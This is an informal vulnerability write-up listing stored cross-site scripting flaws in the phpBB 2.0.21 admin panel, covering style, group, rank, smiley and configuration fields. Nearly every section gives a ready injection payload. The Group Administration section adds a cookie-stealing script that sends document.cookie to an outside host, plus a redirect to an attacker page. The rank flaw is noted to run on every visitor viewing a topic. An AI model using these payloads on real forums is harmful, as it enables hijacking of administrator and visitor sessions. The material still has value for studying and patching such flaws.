phpBB 2.0.21 XSS in administration

Style Admin
-----------

Management & Create a theme

Lots of input are not properly "filtrate" like style_name, head_stylesheet, body_background, tr_color1_name (all the input in simple name)...

We cand ofcourse inject html in this way : "><h1>Owned by Blwood :P</h1> 
but it's more interresting to inject javascript :) : 
"><body onload="alert('Owned by Blwood')"> => style_name
"><script>alert('Owned by Blwood')</script> => head_stylesheet, body_background, ...
When an admin will go in Style Administration he will be Owned. (inject in style_name)
When an admin will edit a them he will be Owned.


Group Administration
--------------------

Management

Input group_description is not correctly "filtrated" we can inject js like this : "><script>alert('Owned by Blwood')</script> or </textare>"><script>alert('Owned by Blwood')</script>
When an admin will go in Group administration he'll be owned. But what's more, the groups can be seen in groupcp.php 
by every visitors.
An exploit could be : 
</textarea>"><script>document.location='http://127.0.0.1/cookie.php?'+document.cookie</script>
or
</textarea>"><script>document.location='http://site.com/ownedpage.html'</script>

Ranks
-----

Rank Administration

Rank Title (input title) is not correctly filtrated, we can inject js like : "><script>alert('xss')</script>
But what's interresting, if you give this rank to an user, the rank will appear in user's topics and the code will be executed when someone sees a topic :)
Now you can inject what you want but maximum 40 caracters...



Smilies
-------

Smiles Editing Utility

Smiley Code : "><body onload="alert('Owned by Blwood')">

Configuration
-------------

General Configuartion

Inputs are not correctyle filtrated : Ex : allow_html_tags  => "><script>alert('Owned by Blwood')</script>
